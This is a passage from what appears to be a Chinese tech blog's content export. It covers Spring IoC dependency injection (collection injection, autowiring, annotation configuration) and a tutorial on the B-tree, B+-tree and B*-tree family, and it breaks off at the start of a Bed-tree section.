dept=Department{dname='技术部'}}\n```\n\n### 注入集合类型属性\n\nStep1：创建类，定义数组、list、set、map类型属性，生成对应set方法 \n\n```java\npackage com.jwt.ioc;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class Stu {\n    //1 数组类型属性\n    private String[] courses;\n    // 2 list集合类型属性\n    private List<String> list;\n    // 3 set集合类型属性\n    private Set<String> sets;\n    // 4 map集合类型属性\n    private Map<String, String> maps;\n\n    public void setCourses(String[] courses) {\n        this.courses = courses;\n    }\n\n    public void setList(List<String> list) {\n        this.list = list;\n    }\n    \n    public void setSets(Set<String> sets) {\n        this.sets = sets;\n    }\n    \n    public void setMaps(Map<String, String> maps) {\n        this.maps = maps;\n    }\n\n    @Override\n    public String toString() {\n        return \"Stu{\" +\n                \"courses=\" + Arrays.toString(courses) +\n                \", list=\" + list +\n                \", maps=\" + maps +\n                \", sets=\" + sets +\n                '}';\n    }\n}\n```\n\nStep2：在spring配置文件进行配置 \n\n```xml\n<bean id=\"stu\" class=\"com.jwt.ioc.Stu\">\n        <!--数组类型属性注入-->\n        <property name=\"courses\">\n            <array>\n                <value>Spring课程</value>\n                <value>Mybatis课程</value>\n            </array>\n        </property>\n        <!--list类型属性注入-->\n        <property name=\"list\">\n            <list>\n                <value>测试1</value>\n                <value>测试2</value>\n            </list>\n        </property>\n        <!--set类型属性注入-->\n        <property name=\"sets\">\n            <set>\n                <value>data1</value>\n                <value>data2</value>\n            </set>\n        </property>\n        <!--map类型属性注入-->\n        <property name=\"maps\">\n            <map>\n                <entry key=\"语言1\" value=\"Java\"></entry>\n                <entry key=\"语言2\" value=\"C++\"></entry>\n            </map>\n        </property>\n</bean>\n```\n\nStep3：测试\n\n```java\npublic class BeanTest {\n    @Test\n    public  void test(){\n        //1 加载 spring 配置文件\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean5.xml\");\n        //2 获取配置创建的对象\n        Stu stu = context.getBean(\"stu\", Stu.class);\n        System.out.println(stu);\n    }\n}\n\n//Stu{courses=[Spring课程, Mybatis课程], list=[测试1, 测试2], maps={语言1=Java, 语言2=C++}, sets=[data1, data2]}\n```\n\n### 集合注入对象类型\n\n一个学生有多门课程\n\n```java\npackage com.jwt.ioc;\nimport java.util.List;\n\npublic class Stu{\n    private List<Course> courseList;\n    public void setCourseList(List<Course> courseList) {\n        this.courseList = courseList;\n    }\n\n    @Override\n    public String toString() {\n        return \"Stu{\" +\n                \"courseList=\" + courseList +\n                '}';\n    }\n}\n```\n\n```java\npackage com.jwt.ioc;\n\npublic class Course {\n    private String cname;\n    public void setCname(String cname) {\n        this.cname = cname;\n    }\n\n    @Override\n    public String toString() {\n        return \"Course{\" +\n                \"cname='\" + cname + '\\'' +\n                '}';\n    }\n}\n```\n\n在spring配置文件进行配置 \n\n```xml\n<!--创建多个course对象-->\n<bean id=\"course1\" class=\"com.jwt.ioc.Course\">\n  <property name=\"cname\" value=\"Spring5框架\"></property>\n</bean>\n<bean id=\"course2\" class=\"com.jwt.ioc.Course\">\n  <property name=\"cname\" value=\"MyBatis框架\"></property>\n</bean>\n\n<bean id=\"stu\" class=\"com.jwt.ioc.Stu\">\n  <!--注入list集合类型，值是对象-->\n  <property name=\"courseList\">\n    <list>\n      <ref bean=\"course1\"></ref>\n      <ref bean=\"course2\"></ref>\n    </list>\n  </property>\n</bean>\n```\n\n### 集合注入部分抽取成公共部分\n\n```java\npublic class Stu{\n\t\t//list集合类型属性\n    private List<String> book;\n    public void setBook(List<String> book) {\n        this.book = book;\n    }\n\n    @Override\n    public String toString() {\n        return \"Stu{\" +\n                \"book=\" + book +\n                '}';\n    }\n}\n```\n\nStep1：在spring配置文件中引入名称空间 util \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:util=\"http://www.springframework.org/schema/util\" <!--添加util名称空间-->\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/util  http://www.springframework.org/schema/util/spring-util.xsd \"> <!--添加util名称空间-->\n\n</beans>\n```\n\nStep2：使用util标签完成list集合注入提取 \n\n```xml\n    <!--1 提取list集合类型属性注入-->\n    <util:list id=\"bookList\">\n        <value>易筋经</value>\n        <value>九阴真经</value>\n        <value>九阳神功</value>\n    </util:list>\n    <!--2 提取list集合类型属性注入使用-->\n    <bean id=\"stu\" class=\"com.jwt.ioc.Stu\">\n        <property name=\"book\" ref=\"bookList\"></property>\n    </bean>\n```\n\nStep2：测试\n\n```java\npublic class BeanTest {\n    @Test\n    public  void test(){\n        //1 加载 spring 配置文件\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean5.xml\");\n        //2 获取配置创建的对象\n        Stu stu = context.getBean(\"stu\", Stu.class);\n        System.out.println(stu);\n    }\n}\n\n//Stu{book=[易筋经, 九阴真经, 九阳神功]}\n```\n\n### XML自动装配\n\n什么是自动装配：根据指定装配规则(属性名称或者属性类型)，Spring 自动将匹配的属性值进行注入\n\n实现自动装配：使用 Bean 标签属性 autowire，配置自动装配 autowire 属性常用两个值：\n\n- byName 根据属性名称注入 ，注入值 bean 的 id 值和类属性名称一样 \n- byType 根据属性类型注入\n\n1、根据属性名称自动注入 \n\n```xml\n<bean id=\"empAuto\" class=\"com.jwt.ioc.Employee\" autowire=\"byName\"></bean>\n<bean id=\"deptAuto\" class=\"com.jwt.ioc.Department\"></bean>\n```\n\n2、根据属性类型自动注入 \n\n```xml\n<bean id=\"empAuto\" class=\"com.jwt.ioc.Employee\" autowire=\"byType\"></bean>\n<bean id=\"deptAuto\" class=\"com.jwt.ioc.Department\"></bean>\n```\n\n### 引入外部配置文件\n\n> 场景：配置 druid 数据库连接池\n\n**方式一：直接配置数据库信息**\n\n1、引入Druid连接池依赖 jar 包\n\n下载地址：https://repo1.maven.org/maven2/com/alibaba/druid/\n\n2、配置Druid（德鲁伊）连接池\n\n```xml\n<!--直接配置连接池-->\n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n  <property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"></property>\n  <property name=\"url\" value=\"jdbc:mysql://localhost:3306/userDb\"></property>\n  <property name=\"username\" value=\"root\"></property>\n  <property name=\"password\" value=\"root\"></property>\n</bean>\n```\n\n**方式二：引入外部配置文件**\n\n1、创建外部属性文件 druid.properties，写数据库信息\n\n```properties\nprop.driverClass=com.mysql.jdbc.Driver\nprop.url=jdbc:mysql://localhost:3306/dbname\nprop.username=root\nprop.password=root\n```\n\n2、引入 context 名称空间\n\n `xmlns:context=\"http://www.springframework.org/schema/context\"和http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n\n</beans>\n```\n\n3、把外部 properties 属性文件引入到 Spring 配置文件中 ，`${}`取值\n\n```xml\n<!--引入外部属性文件--> \n<context:property-placeholder location=\"classpath:druid.properties\"/>\n<!--配置连接池--> \n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n  <property name=\"driverClassName\" value=\"${prop.driverClass}\"></property>\n  <property name=\"url\" value=\"${prop.url}\"></property>\n  <property name=\"username\" value=\"${prop.userName}\"></property>\n  <property name=\"password\" value=\"${prop.password}\"></property>\n</bean>\n```\n\n## 基于注解方式\n\n### 什么是注解 \n\n- 注解是代码特殊标记，格式：@注解名称(属性名称=属性值, 属性名称=属性值...) \n- 使用注解，注解作用在类上面，方法上面，属性上面 \n- 使用注解目的：简化xml配置 \n\n###  Spring 提供注解\n\n- @Component \n- @Service \n- @Controller\n- @Repository\n\n 上面四个注解功能是一样的，都可以用来创建bean实例 \n\n@Service一般用在service层，@Controller一般用在web层，@Repository一般用在dao层\n\n### 基于注解方式创建对象\n\nStep1：引入依赖 `spring-aop-5.3.18.jar`\n\nStep2：开启组件扫描\n\n- 如果扫描多个包，多个包使用逗号隔开\n- 或者扫描该包的上层目录（推荐）\n\n```xml\n<!--先引入context名称空间-->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n\n</beans>\n\n<!--再开启组件扫描-->\n<context:component-scan base-package=\"com.jwt.annotation\"/>\n```\n\nStep3：创建类，在类上面添加创建对象注解 \n\n```java\n@Service(value = \"userService\")\npublic class UserService {\n    public void add() {\n        System.out.println(\"annotation service add ...\");\n    }\n}\n```\n\n在注解里面 value 属性值可以省略不写，**默认值是类名称，首字母小写**即`UserService-->userService`\n\n注解配置等同xml这段配置`<bean id=\"userService\" class=\"...\">`\n\n### 组件扫描配置\n\n```xml\n<!--开启组件扫描-->\n<context:component-scan base-package=\"com.jwt\"/>\n```\n\n上面表示会扫 base-package 下的所有注解，如何配置在 base-package 下哪些类扫描，哪些类不扫描？\n\n配置组件扫描配置的参数：\n\n- use-default-filters=\"false\"  表示现在不使用默认 filter，采用自己配置 filter\n\n- context:include-filter  设置扫描哪些内容 \n\n- context:exclude-filter  设置哪些内容不进行扫描 \n\n1、只扫描 base-package下带 Controller 的注解\n\n```xml\n<context:component-scan base-package=\"com.jwt\" use-default-filters=\"false\">\n    <context:include-filter type=\"annotation\"\n                            expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n\n```\n\n2、不扫描 base-package 下带 Controller 的注解\n\n```xml\n<context:component-scan base-package=\"com.jwt\">\n    <context:exclude-filter type=\"annotation\"\n                            expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n```\n\n### 基于注解方式注入属性\n\n- **@Autowired：根据属性类型进行自动装配**\n\nStep1：把service和dao对象创建，在service和dao类添加创建对象注解\n\n```java\n@Service(value = \"userService\")\npublic class UserService {\n    public void add() {\n        System.out.println(\"annotation service add ...\");\n    }\n}\n\n\n@Repository(value = \"userDao\")\npublic class UserDao {\n    public void add() {\n        System.out.println(\"annotation dao add...\");\n    }\n}\n\n```\n\nStep2：在service注入dao对象，在service类添加dao类型属性，在属性上面使用注解 \n\n```java\n@Service(value = \"userService\")\npublic class UserService {\n    // 注入userDao对象\n    @Autowired\n    private UserDao userDao;//不需要添加set方法\n\n    public void add() {\n        userDao.add();//调用dao方法\n        System.out.println(\"annotation service add ...\");\n    }\n}\n```\n\nStep3：测试\n\n```java\n@Test\npublic  void test(){\n  //1 加载 spring 配置文件\n  ApplicationContext context =\n    new ClassPathXmlApplicationContext(\"bean.xml\");\n  //2 获取配置创建的对象\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  System.out.println(userService);\n  userService.add();\n}\n\n/**\ncom.jwt.annotation.UserService@12d4bf7e\nannotation dao add...\nannotation service add ...\n**/\n```\n\n- **@Qualifier：根据名称进行注入**\n\n这个 @Qualifier 注解的使用，和上面@Autowired 一起使用\n\n使用场景：由于@Autowired注解是按照属性类型进行注入，如果 bean 容器中有多个同一类型的实例对象，就需要使用 @Qualifier 根据实例名称指定注入哪一个实例对象\n\n```java\n@Autowired //根据类型进行注入\n@Qualifier(value = \"userDaoImpl1\")//根据名称进行注入\nprivate UserDao userDao;\n```\n\n- **@Resource：可以根据类型注入，也可以根据名称注入(javax扩展包中的注解)**\n\n```java\nimport javax.annotation.Resource;\n\n@Resource(name = \"userDaoImpl1\")\nprivate UserDao userDao;\n```\n\n- **@Value：注入普通类型属性**\n\n```java\n@Value(value = \"小明\")\nprivate String name;\n```\n\n### 完全注解开发\n\nStep1：创建配置类，替代 xml 配置文件\n\n- `@Configuration`: 作为配置类 替代xml配置文件\n\n- `@ComponentScan`: 开启组件扫描\n\n```java\n@Configuration\n@ComponentScan(basePackages = {\"com.jwt\"})\npublic class SpringConfig {\n}\n```\n\nStep2：编写测试类\n\n使用`AnnotationConfigApplicationContext`加载配置类\n\n```java\n@Test\npublic void test() {\n  AnnotationConfigApplicationContext context = \n    new AnnotationConfigApplicationContext(SpringConfig.class);\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  System.out.println(userService);\n  userService.add();\n}\n\n/**\ncom.jwt.annotation.UserService@6580cfdd\nannotation dao add...\nannotation service add ...\n**/\n```\n\n### **注解格式和XML格式混用**\n\n由于早起开发的系统大部分都是采用xml的形式配置bean，现在的企业级开发基本上不用这种模式了。但是如果你特别幸运，需要基于之前的系统进行二次开发，这就尴尬了。新开发用注解格式，之前开发的是xml格式。这个时候可不是让你选择用哪种模式的，而是两种要同时使用。spring提供了一个注解可以解决这个问题，`@ImportResource`，在配置类上直接写上要被融合的xml配置文件名即可，算的上一种兼容性解决方案，没啥实际意义。\n\n```java\n@Configuration\n@ImportResource(\"applicationContext1.xml\")\npublic class SpringConfig {\n}\n```\n\n### proxyBeanMethods属性\n\n前面用到了@Configuration这个注解，当我们使用AnnotationConfigApplicationContext加载配置类的时候，配置类可以不添加这个注解。但是这个注解有一个更加强大的功能，它可以保障配置类中使用方法创建的bean的唯一性。为@Configuration注解设置proxyBeanMethods属性值为true即可，由于此属性默认值为true，所以很少看见明确书写的，除非想放弃此功能。\n\n```JAVA\n@Configuration(proxyBeanMethods = true)\npublic class SpringConfig {\n    @Bean\n    public Cat cat(){\n        return new Cat();\n    }\n}\n```\n\n下面通过容器再调用上面的cat方法时，得到的就是同一个对象了。注意，必须使用spring容器对象调用此方法才有保持bean唯一性的特性。此特性在很多底层源码中有应用。\n\n```JAVA\npublic class App {\n    public static void main(String[] args) {\n        ApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);\n        String[] names = ctx.getBeanDefinitionNames();\n        for (String name : names) {\n            System.out.println(name);\n        }\n        System.out.println(\"-------------------------\");\n        SpringConfig springConfig = ctx.getBean(\"springConfig\", SpringConfig.class);\n        System.out.println(springConfig.cat());\n        System.out.println(springConfig.cat());\n        System.out.println(springConfig.cat());\n    }\n}\n```\n\n## 参考\n\n- [Spring知识点精简版梳理（一）——概述](https://blog.csdn.net/qq_35843514/article/details/114287046?spm=1001.2014.3001.5501)\n\n- [Spring-全面详解（学习总结）](https://blog.csdn.net/weixin_44207403/article/details/106736102?ops_request_misc=%7B%22request%5Fid%22%3A%22161443766616780357241220%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=161443766616780357241220&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-106736102.first_rank_v2_pc_rank_v29&utm_term=Spring)\n\n- [Spring Framework 中文文档](https://www.docs4dev.com/docs/zh/spring-framework/5.1.3.RELEASE/reference/)\n\n- [Spring 框架概述 | 中文文档 (gitcode.net)](https://docs.gitcode.net/spring/guide/spring-framework/overview.html)\n- [Spring-IOC容器](https://blog.csdn.net/xiaoyixiao_/article/details/116835572)\n- [spring IOC容器管理必须知道这些操作](https://blog.csdn.net/weixin_45496190/article/details/107059038?spm=1001.2014.3001.5502)\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"数据结构：B-Tree家族","url":"/posts/30130.html","content":"\n## B-tree\n\n```\n\n```\n\n**论文名称：《Organization and maintenance of large ordered indices Share on》**\n\n- 作者：R. Bayer，E. McCreight\n- 单位：Mathematical and Information Sciences Laboratory\n- 会议：[SIGMOD](https://dl.acm.org/doi/10.1145/1734663.1734671)【CCF A】\n- 时间：1970年11月\n\n### 为什么 B-tree 会诞生呢？\n\n- 为了减少磁盘 I/O 操作\n  - 我们假设数据量达到了亿级别，内存根本存储不下，我们只能以块的形式从磁盘读取数据，与内存的访问时间相比，磁盘 I/O 操作相当耗时(慢上百倍千倍甚至万倍)，所以，我们应当尽量减少从磁盘中读取数据的次数。\n\n- 为了一次磁盘 I/O 操作读取更多数据\n  - 从磁盘中读取数据时，都是按照磁盘块来读取的，并不是一条一条的读。如果我们能把尽量多的数据放进磁盘块中，那一次磁盘读取操作就会读取更多数据，那我们查找数据的时间也会大幅度降低。\n\n我们都知道平衡二叉树中一个结点只能最多 2 个子结点，每个节点只存储一个数据。那么我们如何改进呢？\n\n一个自然而然的想法！**让每个结点可以有更多的数据项和更多的子结点**\n\n好的，你已经发明了 B-Tree ！！！\n\n下面就来具体介绍一下 B-Tree\n\n### 简介\n\nB-tree 是一种多路平衡查找树，提出 B-tree 的主要目的就是减少磁盘的 I/O 操作。\n\n**一个 m 阶的 B-tree 具有如下几个特征：**\n\n- 1、根结点至少有 2 个子结点\n- 2、每个非根的分支结点都有 k-1 个元素和 k 个孩子，其中 ⎡m/2⎤≤ k ≤ m\n- 3、每一个叶子结点都有 k-1 个元素，其中 ⎡m/2⎤≤ k ≤ m\n- 4、所有的叶子结点都位于同一层。\n- 5、每个节点中的元素从小到大排列，节点当中 k-1 个元素正好是 k 个孩子包含的元素的值域分划。\n\n术语：3 阶 B-tree 称为 2-3 树、4 阶 B-tree 称为 2-3-4 树\n\n如下图是一颗标准的 3 阶 B-tree ：\n\n![](https://img.jwt1399.top/img/image-20220414161200077.png)\n\n- m = 3、2 ≤ k ≤ 3\n- 该树满足上述所有特征\n\n那么如图的树是怎么构造的呢？下面为我们来一步一步来构造哈\n\n### 插入\n\n#### 规则\n\n首先判断是否是空树\n\n- 若是空树，则创建结点，插入key\n\n- 若不是空树\n\n  - 1、根据左大右小规则找到待插入结点位置\n\n  - 2、判断当前结点 key 的个数是否小于 k-1，若满足，则直接插入\n\n  - 3、若不满足，以结点中间的 key 为中心分裂成左右两部分，中间关键字元素上移到父结点中（如果父结点空间满了，也同样需要“分裂”操作），这个 key 的左子树指向分裂后的左半部分，这个 key 的右子支指向分裂后的右半部分，然后将当前结点指向父结点。\n\n#### 示例\n\n🌰：构造一个 3 阶 B-tree ，存储数据{1,2,3,4,5,6,7,8,9,10}\n\n- m = 3、2 ≤ k ≤ 3、1 ≤ k-1 ≤ 2\n\n| 插入1，2                                                     | 插入3                                                        | 插入4                                                        |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220414143100841.png) | ![](https://img.jwt1399.top/img/image-20220414143124434.png) | ![](https://img.jwt1399.top/img/image-20220414145559175.png) |\n| **插入5**                                                    | **插入6**                                                    | **插入7**                                                    |\n| ![](https://img.jwt1399.top/img/image-20220414145647323.png) | ![](https://img.jwt1399.top/img/image-20220414150119829.png) | ![](https://img.jwt1399.top/img/image-20220414150314053.png) |\n| **插入8**                                                    | **插入9**                                                    | **插入10**                                                   |\n| ![](https://img.jwt1399.top/img/image-20220414150910287.png) | ![](https://img.jwt1399.top/img/image-20220414151121225-20220415173523197.png) | ![](https://img.jwt1399.top/img/image-20220414161200077.png) |\n\n- 插入1时，为空树，建立结点直接插入\n- 插入2时，满足结点的key个数 ≤ k-1，直接插入当前结点\n- 插入3时，不满足结点的key个数 ≤ k-1，进行分裂操作\n  - 将2升至父结点，1为左结点，3为右结点\n- 插入4时，满足结点的key个数 ≤ k-1，直接插入当前结点\n- 插入5时，不满足结点的key个数 ≤ k-1，进行分裂操作\n  - 将4升至父结点，3为左结点，5为右结点\n- 插入6时，满足结点的key个数 ≤ k-1，直接插入当前结点\n- 插入7时，不满足结点的key个数 ≤ k-1，进行分裂操作\n  - 将6升至父结点，5为左结点，7为右结点\n  - 6升至父结点后，父结点key个数已经超过 k-1\n  - 执行分裂操作，再将4升入父节点，2为左结点，6为右结点\n- 插入8时，满足结点的key个数 ≤ k-1，直接插入当前结点\n- 插入9时，不满足结点的key个数 ≤ k-1，进行分裂操作\n  - 将8升至父结点，7为左结点，9为右结点\n- 插入10时，满足结点的key个数 ≤ k-1，直接插入当前结点\n\n**插入动态演示：**[B-Tree 动态演示](https://www.cs.usfca.edu/~galles/visualization/BTree.html)\n\n### 删除\n\nB-tree 的删除比插入更复杂一些，因为删除之后还涉及到移动元素的操作。\n\n#### 规则\n\n根据左大右小规则找到待删除结点位置\n\n- 情况1：位于叶子结点上，直接删除\n  - (1.1)如果删除后，结点key个数还是满足 k-1 范围 ，那么结束删除操作\n  - (1.2)反之，父节点中的key下移...\n- 情况2：位于分支结点上，首先找到删除节点的后继节点，用后继节点覆盖要删除的节点，再删除后继节点\n  - (2.1)如果删除后该节点中关键字的个数大于等于 k-1，那么结束删除操作\n  - (2.2)如果兄弟节点key个数满足 k-1，将父节点中的key下移到该节点，兄弟节点中的一个key上移，删除操作结束\n  - (2.3)如果兄弟节点key个数小于 k-1，将父节点中的key下移到该节点，并与它的兄弟节点中的key合并，形成一个新的节点，然后修改指向即可。\n\n#### 示例\n\n| 原始B-Tree                                                   | 删除10                                                       | 再删除9                                                      |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220414161200077.png) | ![](https://img.jwt1399.top/img/image-20220414151121225.png) | ![](https://img.jwt1399.top/img/image-20220414162723953.png) |\n| **再删除2**                                                  | **原图-删除2**                                               | **原图-删除8**                                               |\n| ![](https://img.jwt1399.top/img/image-20220414170411469.png) | ![](https://img.jwt1399.top/img/image-20220414164202330.png) | ![](https://img.jwt1399.top/img/image-20220414165708210.png) |\n\n- 删除 10 时，满足情况 1.1\n- 再删除 9 时，满足情况 1.2\n- 再删除 2 时，满足情况 2.3\n\n- 删除 8 时，满足情况 2.1\n- 删除 2 时，满足情况 2.2\n\n\n\n### 效率\n\n假设我们现在有 838,8608 条记录\n\n- 对于 AVL 树而言，树的高度 h = log<sub>2</sub>(838,8608) ≈ 23，也就是说如果要查找到叶子结点需要 23 次磁盘 I/O 操作\n\n- 对于 B-Tree，假设每个结点 8 个元素（当然真实情况下没有这么平均，有的结点比8多一些，有些比 8 少一些），树的高度 h = log<sub>8</sub>(838,8608) ≈ 8  ，也就是说如果要查找到叶子结点需要 8 次磁盘 I/O 操作\n\n##  B<sup>+</sup>-tree\n\n### 为什么 B<sup>+</sup>-tree 会诞生呢？\n\nB-tree 仍然有一个致命的缺陷，那就是它的索引与数据绑定在一块，而数据的大小很有可能远远超过了索引数据，查找中途过程会加载很多无用的数据，这会大大减小一次 I/O 有用数据的获取，间接的增加 I/O 次数去获取有用的索引数据。\n\n因此，如果只把数据存储在最终查询到的那个节点是不是就可以了？但是谁知道哪个节点就是最终要查询的节点呢？\n\n B<sup>+</sup>-tree 横空出世，B<sup>+</sup>-tree 树就是为了拆分索引与数据的多路平衡查找树。\n\n### 简介\n\nB<sup>+</sup>-tree 是 B-tree 的变体\n\n**一个 m 阶 B<sup>+</sup>-tree 树具有如下几个特征：**\n\n- 1、根结点至少有 2 个子结点\n\n- 2、每个非根的分支结点都有 k-1 个元素和 k 个孩子，其中 ⎡m/2⎤≤ k ≤ m\n  -  此处颇有争议，到底是与B-tree k-1 个元素和 k 个孩子，还是不一致：k 个元素和 k 个孩子，待查证\n- 3、B<sup>+</sup>-tree 非叶子节点上是不存储数据的，仅存储键值用来索引，所有数据都保存在叶子节点且叶子结点本身依关键字的大小自小而大顺序链接。\n\n如下图是一颗标准的 3 阶 B<sup>+</sup>-tree ：\n\n![](https://img.jwt1399.top/img/image-20220414230923235.png)\n\n头叶结点之前其实还有一个头指针，上图没有画出\n\n### 插入\n\n插入规则与 B-tree 类似\n\n#### 示例\n\n🌰：构造一个 3 阶 B-tree ，存储数据{1,2,3,4,5,6,7,8,9,10}\n\n- m = 3、2 ≤ k ≤ 3\n\n| 插入1、2                                                     | 插入3                                                        | 插入4                                                        |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220414143100841.png) | ![](https://img.jwt1399.top/img/image-20220414225825667.png) | ![](https://img.jwt1399.top/img/image-20220414225927090.png) |\n| **插入5**                                                    | **插入6**                                                    | **插入7**                                                    |\n| ![](https://img.jwt1399.top/img/image-20220414230530478.png) | ![](https://img.jwt1399.top/img/image-20220414230611439.png) | ![](https://img.jwt1399.top/img/image-20220414230754985.png) |\n| **插入8**                                                    | **插入9**                                                    | **插入10**                                                   |\n| ![](https://img.jwt1399.top/img/image-20220414230839477.png) | ![](https://img.jwt1399.top/img/image-20220414230857886.png) | ![](https://img.jwt1399.top/img/image-20220414230923235-20220415173651956.png) |\n\n###  删除\n\n与 B-tree 类似\n\n### 查找\n\nB<sup>+</sup>-tree 的查找与B树不同，当索引部分某个结点的关键字与所查的关键字相等时，并不停止查找，应继续沿着这个关键字左边的指针向下，一直查到该关键字所在的叶子结点为止。\n\n### 效率\n\n生产环境中B<sup>+</sup>-tree的高度一般就 3～4 层\n\n一棵 B+ 树的存放总记录数为：索引结点指针数 \\* 单个叶子节点记录行数。\n\n我们假设主键 ID 为 bigint 类型，长度为 8 字节，而指针大小在设置为 6 字节，这样一共 14 字节，我们一个结点中能存放多少这样的单元，其实就代表有多少指针，即 16384/14=1170\n\nInnoDB 中页的默认大小是 16KB，假设一行记录的数据大小为 1k，则一个叶子结点（页）中的记录数 = 16K/1K = 16\n\n一个高度为 3 的 B+ 树可以存放： 1170\\*1170\\*16 = 21902400 条这样的记录。\n\n一般根节点是常驻内存的，所以一般我们查找 2千多万的数据，只需要 2 次磁盘 IO。\n\n### B<sup>+</sup>-tree和B-tree的区别\n\n- B-tree 内部节点是保存数据的；B<sup>+</sup>-tree内部节点是不保存数据的，只作索引作用，它的叶子节点才保存数据。\n- B<sup>+</sup>-tree 相邻的叶子节点之间是通过链表指针连起来的，B-tree却不是。\n- 查找过程中，B-tree在找到具体的数值以后就结束，B<sup>+</sup>-tree则需要通过索引找到叶子结点中的数据才结束\n- B-tree中任何一个关键字出现且只出现在一个结点中，B<sup>+</sup>-tree可以出现多次。\n\n### B<sup>+</sup>-tree优点\n\n1. **I/O次数更少**：B<sup>+</sup>-tree 的内部结点没有存储关键字，所以同样大小的磁盘页能容纳更多结点。一次性读入内存中的也就越多，相对来说IO读写次数也就降低了\n2. **查询速度更稳定**：B<sup>+</sup>-tree 所有关键字数据地址都存在**叶子结点**上，所以每次查找的次数都相同所以查询速度要比B树更稳定;\n3. **范围查询更简便**：B<sup>+</sup>-tree 所有的叶子节点数据构成了一个有序链表，在查询大小区间的数据时候更方便，数据紧密性很高，缓存的命中率也会比B树高。\n4. **全结点遍历更快：**B<sup>+</sup>-tree 遍历整棵树只需要遍历所有的叶子节点即可， B-tree 需要对每一层进行遍历，这有利于数据库做全表扫描。\n\n### 为什么 MySQL 的索引要使用 B+树而不是B树？\n\n**因为 B 树不管叶子节点还是非叶子节点，都会保存数据**，这样导致在非叶子节点中能保存的指针数量变少，指针少的情况下要保存大量数据，只能增加树的高度，导致 IO 操作变多，查询性能变低。\n\n\n\n- [高性能 GPU 并发 B+ 树](https://dl.acm.org/doi/10.1145/3503221.3508419)【CCF A】\n\n- [设计高性能 GPU B 树](https://dl.acm.org/doi/10.1145/3293883.3295706)【CCF A】\n\n## B<sup>*</sup>-tree\n\nB<sup>\\*</sup>-tree 是 B<sup>+</sup>-tree 的变体，它是在 B<sup>+</sup>-tree 的基础上，将索引层也以指针连接起来，使搜索取值更加快捷。\n\n与B<sup>+</sup>-tree\n\n- 首先是关键字个数限制问题\n  - B<sup>+</sup>-tree 初始化个数是⎡m/2⎤≤ k ≤ m\n  - B<sup>\\*</sup>-tree 初始化个数为⎡2m/3⎤≤ k ≤ m\n\n- B<sup>+</sup>-tree 结点满时就会分裂，B<sup>\\*</sup>-tree 结点满时会检查兄弟节点是否满（因为每个节点都有指向兄弟的指针）\n  - 如果兄弟结点未满则向兄弟节点转移关键字\n  - 如果兄弟节点已满，则从当前节点和兄弟节点各拿出 1/3 的数据创建一个新的节点出来\n\n| B<sup>+</sup>-tree                     | B<sup>\\*</sup>-tree                    |\n| -------------------------------------- | -------------------------------------- |\n| ![](https://img.jwt1399.top/img/1.jpg) | ![](https://img.jwt1399.top/img/2.jpg) |\n\n### 对比\n\n- B<sup>+</sup>-tree：在 B-tree 基础上，为**叶子结点**增加链表指针，所有关键字都在叶子结点中出现，非叶子结点作为叶子结点的索引；B+树总是到叶子结点才命中\n\n- B<sup>*</sup>-tree：在 B<sup>+</sup>-tree 基础上，为**非叶子结点**也增加链表指针，将结点的空间利用率从1/2提高到2/3，查询速率也有所提高。又存有兄弟节点的指针，可以向兄弟节点转移关键字的特性使得 B<sup>\\*</sup>-tree 分解次数变得更少；\n\n## B<sup>ed</sup>-tree\n\n**论文名称：《B<sup>ed</sup>-tree: an all-purpose index structure 